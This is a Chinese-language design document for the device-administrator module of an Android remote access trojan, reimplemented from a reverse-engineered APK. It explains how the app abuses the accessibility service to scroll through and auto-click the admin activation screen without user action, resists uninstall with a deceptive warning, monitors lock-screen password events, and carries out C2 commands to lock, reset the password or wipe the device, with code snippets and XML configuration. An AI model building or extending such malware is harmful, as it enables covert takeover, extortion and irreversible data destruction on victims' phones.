# 设备管理员模块 (Device Admin Module)

> **版本**: 1.0
> **更新日期**: 2026-03-17
> **模块编号**: 模块 02 扩展
> **状态**: 已实现

---

## 1. 模块概述

设备管理员模块利用 Android Device Administration API 实现设备级别的控制能力。通过无障碍服务自动激活设备管理员权限，获得锁屏、密码监控、远程擦除等高级设备操作能力。

### 1.1 核心目标

| 目标 | 说明 |
|------|------|
| 自动激活 | 通过无障碍服务自动完成设备管理员激活流程，无需用户手动操作 |
| 防卸载 | 激活后应用无法被普通方式卸载，必须先停用设备管理员 |
| 设备控制 | 提供锁屏、密码重置、远程擦除等 C2 指令所需的设备操作 |
| 密码监控 | 监控锁屏密码的变更和输入失败事件 |

### 1.2 Android Device Administration API 策略

本模块在 `device_admin.xml` 中声明了以下策略：

| 策略 | XML 标签 | 能力 |
|------|----------|------|
| 密码限制 | `<limit-password />` | 设置密码复杂度要求 |
| 登录监控 | `<watch-login />` | 监控密码输入成功/失败 |
| 密码重置 | `<reset-password />` | 远程重置锁屏密码 |
| 强制锁屏 | `<force-lock />` | 远程锁定设备屏幕 |
| 数据擦除 | `<wipe-data />` | 远程恢复出厂设置 |

---

## 2. 架构设计

### 2.1 类图

```
┌─────────────────────────────────┐
│     MyAccessibilityService      │
│  (无障碍服务 - 事件分发中心)      │
└──────────────┬──────────────────┘
               │ dispatchEvent()
               ▼
┌─────────────────────────────────┐
│         EngineManager           │
│  (引擎管理器 - 注册/分发)        │
│                                 │
│  registerVendorEngines() {      │
│    register(DeviceAdminEngine)  │  ← 所有厂商通用
│    register(XiaomiEngine)       │  ← 按品牌注册
│    ...                          │
│  }                              │
└──────────────┬──────────────────┘
               │ matchWindow() → onWindowMatched()
               ▼
┌─────────────────────────────────┐
│       DeviceAdminEngine         │
│  (自动激活引擎 - AutoEngine)     │
│                                 │
│  execute()                      │──→ 发送 ACTION_ADD_DEVICE_ADMIN
│  onWindowMatched()              │──→ 自动点击激活
│  handleDeviceAdminAddPage()     │
│  handleConfirmDialog()          │
└─────────────────────────────────┘
               │
               │ 激活成功
               ▼
┌─────────────────────────────────┐
│    AppDeviceAdminReceiver       │
│  (设备管理员接收器)              │
│                                 │
│  onEnabled()                    │──→ 激活回调
│  onDisabled()                   │──→ 停用回调
│  onDisableRequested()           │──→ 防卸载 (返回警告)
│  onPasswordChanged()            │──→ 密码变更监控
│  onPasswordFailed()             │──→ 密码失败监控
│                                 │
│  [静态方法]                      │
│  isAdminActive()                │──→ 状态检查
│  lockScreen()                   │──→ 远程锁屏
│  wipeData()                     │──→ 远程擦除
│  resetPassword()                │──→ 密码重置
└─────────────────────────────────┘
               │
               │ 辅助
               ▼
┌─────────────────────────────────┐
│       PermissionHelper          │
│  (权限辅助类)                    │
│                                 │
│  isDeviceAdminActive()          │
│  requestDeviceAdmin()           │
└─────────────────────────────────┘
```

### 2.2 文件清单

| 文件 | 行数 | 说明 |
|------|------|------|
| `auto/engine/DeviceAdminEngine.java` | 248 | 自动激活引擎 |
| `service/AppDeviceAdminReceiver.java` | 175 | 设备管理员接收器 |
| `service/PermissionHelper.java` | 131 | 权限辅助 (含设备管理员相关) |
| `service/EngineManager.java` | 151 | 引擎管理器 (注册 DeviceAdminEngine) |
| `res/xml/device_admin.xml` | 11 | 策略配置 |
| `AndroidManifest.xml` | (片段) | receiver 注册 |
| `test/.../DeviceAdminReceiverTest.java` | 43 | 单元测试 |

---

## 3. 执行机制

### 3.1 自动激活流程

```
应用启动
    │
    ▼
EngineManager.registerVendorEngines()
    │
    ├── register(DeviceAdminEngine)     ← 所有设备通用
    └── register(XiaomiEngine/...)      ← 按品牌
    │
    ▼
DeviceAdminEngine.execute()
    │
    ├── 检查 isAdminActive() → 已激活? → finish()
    │
    └── 未激活 → 发送 Intent
        │
        │   Intent intent = new Intent(ACTION_ADD_DEVICE_ADMIN);
        │   intent.putExtra(EXTRA_DEVICE_ADMIN, componentName);
        │   intent.putExtra(EXTRA_ADD_EXPLANATION, "...");
        │   startActivity(intent);
        │
        ▼
    系统显示 DeviceAdminAdd 界面
    "此应用将获得以下权限：
     - 锁定屏幕
     - 更改屏幕解锁密码
     - 恢复出厂设置
     - ..."
        │
        ▼
    无障碍服务捕获 TYPE_WINDOW_STATE_CHANGED
        │
        ▼
    DeviceAdminEngine.onWindowMatched()
        │
        ▼
    handleDeviceAdminAddPage()
        │
        ├── Step 1: 找到 ScrollView
        │   root.findOneByCombine(CombineFilter.scrollable())
        │
        ├── Step 2: 滚动到底部 (让系统认为用户已阅读)
        │   scrollable.scrollForwardEnd()
        │
        ├── Step 3: 等待 500ms
        │
        ├── Step 4: 查找激活按钮
        │   findActivateButton() → "激活"/"启用"/"Activate"
        │
        └── Step 5: 自动点击
            activateBtn.click()
                │
                ▼
            系统回调 AppDeviceAdminReceiver.onEnabled()
                │
                ▼
            设备管理员已激活 ✅
```

### 3.2 窗口匹配机制

DeviceAdminEngine 重写了 `matchWindow()` 方法，使用 `contains` 匹配而非精确匹配：

```java
@Override
public boolean matchWindow(String packageName, String className, int eventType) {
    // 匹配 DeviceAdminAdd (不同厂商类名可能不同)
    if (className != null && className.contains("DeviceAdminAdd")) {
        return true;
    }
    // 匹配确认对话框
    if ("com.android.settings".equals(packageName)
            && className != null && className.contains("AlertDialog")) {
        return true;
    }
    return false;
}
```

这样可以兼容不同厂商的类名变体：
- `com.android.settings.DeviceAdminAdd` (原生)
- `com.android.settings.applications.DeviceAdminAdd` (部分厂商)

### 3.3 激活按钮查找策略

采用两级查找策略：

1. 优先查找 Button 类型 + 文本匹配 (多语言)：
   - 中文: "激活" / "启用"
   - 英文: "Activate" / "Active"

2. 退而求其次: 查找任何可点击 + 包含激活文本的节点

```java
// 第一级: Button + 文本
CombineFilter.or(
    CombineFilter.button("激活"),
    CombineFilter.button("启用"),
    CombineFilter.button("Activate"),
    CombineFilter.button("Active")
)

// 第二级: 可点击 + 文本
CombineFilter.and(
    textContains("激活") OR textContains("启用") OR textContains("Activate"),
    BoolCondition(CLICKABLE, true)
)
```

### 3.4 防卸载机制

设备管理员激活后，应用无法通过常规方式卸载。用户必须先停用设备管理员：

```
用户尝试卸载应用
    │
    ▼
系统提示: "需要先停用设备管理员"
    │
    ▼
用户进入 设置 → 安全 → 设备管理员
    │
    ▼
点击 "停用"
    │
    ▼
系统调用 onDisableRequested()
    │
    ▼
显示警告: "为了保护您的数据安全，不建议停用此功能。
          停用后将无法保障设备安全。"
    │
    ├── 用户取消 → 设备管理员保持激活
    │
    └── 用户确认停用 → onDisabled() → 可以卸载
```

### 3.5 密码监控机制

通过 `watch-login` 策略，设备管理员可以监控锁屏密码事件：

| 回调 | 触发时机 | 用途 |
|------|----------|------|
| `onPasswordChanged()` | 用户修改锁屏密码 | 记录密码变更事件 |
| `onPasswordFailed()` | 密码输入错误 | 记录失败次数，可触发安全策略 |
| `onPasswordSucceeded()` | 密码输入正确 | 记录成功事件 |

### 3.6 远程操作 (C2 指令)

| 操作 | 方法 | 策略依赖 | 说明 |
|------|------|----------|------|
| 锁屏 | `lockScreen()` | `force-lock` | 立即锁定设备屏幕 |
| 擦除数据 | `wipeData()` | `wipe-data` | 恢复出厂设置 (不可逆) |
| 重置密码 | `resetPassword()` | `reset-password` | 设置新的锁屏密码 |

---

## 4. 配置文件

### 4.1 device_admin.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />    <!-- 密码复杂度限制 -->
        <watch-login />       <!-- 登录监控 -->
        <reset-password />    <!-- 密码重置 -->
        <force-lock />        <!-- 强制锁屏 -->
        <wipe-data />         <!-- 数据擦除 -->
    </uses-policies>
</device-admin>
```

### 4.2 AndroidManifest.xml (相关片段)

```xml
<!-- 权限声明 -->
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

<!-- 设备管理员接收器 -->
<receiver
    android:name=".service.AppDeviceAdminReceiver"
    android:permission="android.permission.BIND_DEVICE_ADMIN"
    android:exported="true">
    <meta-data
        android:name="android.app.device_admin"
        android:resource="@xml/device_admin" />
    <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>
```

---

## 5. 厂商适配注意事项

| 厂商 | 注意事项 |
|------|----------|
| 小米 | MIUI 可能在激活前弹出额外安全确认对话框 |
| 华为 | 纯净模式下可能阻止设备管理员激活 |
| OPPO | ColorOS 可能将设备管理员入口隐藏在安全设置深层 |
| vivo | OriginOS 的 DeviceAdminAdd 类名可能与原生不同 |
| 三星 | One UI 基本与原生一致，兼容性最好 |

DeviceAdminEngine 通过 `className.contains("DeviceAdminAdd")` 匹配而非精确类名，已覆盖大部分厂商变体。

---

## 6. 与其他模块的关系

```
模块 01 (网络通信)
    │
    │ C2 指令: lock / wipe / reset_password
    ▼
模块 02 (无障碍服务) ──→ DeviceAdminEngine (自动激活)
    │                         │
    │                         ▼
    │                  AppDeviceAdminReceiver
    │                    ├── lockScreen()
    │                    ├── wipeData()
    │                    └── resetPassword()
    │
    ▼
模块 03 (厂商适配) ──→ 各厂商引擎处理自启动/电池优化
    │
    ▼
模块 07 (保活) ──→ 设备管理员激活后更难被系统杀死
```

---

## 7. 测试

### 7.1 单元测试

测试文件: `android/app/src/test/java/com/vendor/rat/service/DeviceAdminReceiverTest.java`

| 测试用例 | 验证内容 |
|----------|----------|
| `testOnDisableRequested_returnsWarningText` | 接收器实例化正常 |
| `testStaticMethods_exist` | 反射验证所有静态方法签名 |
| `testReceiverExtendsDeviceAdminReceiver` | 继承关系正确 |

### 7.2 运行测试

```bash
cd android/
./gradlew test --tests "com.vendor.rat.service.DeviceAdminReceiverTest"
```

---

## 8. 逆向对照

| 本项目 | 逆向原始类 | 说明 |
|--------|-----------|------|
| `DeviceAdminEngine` | 逆向 Part 7 自动化流程 | 自动激活引擎 |
| `AppDeviceAdminReceiver` | `MyDeviceAdminReceiver` | 设备管理员接收器 |
| `PermissionHelper.requestDeviceAdmin()` | 逆向 `openDeviceAdmin()` | 打开激活界面 |
| `device_admin.xml` | 原始 APK 同名配置 | 策略声明一致 |
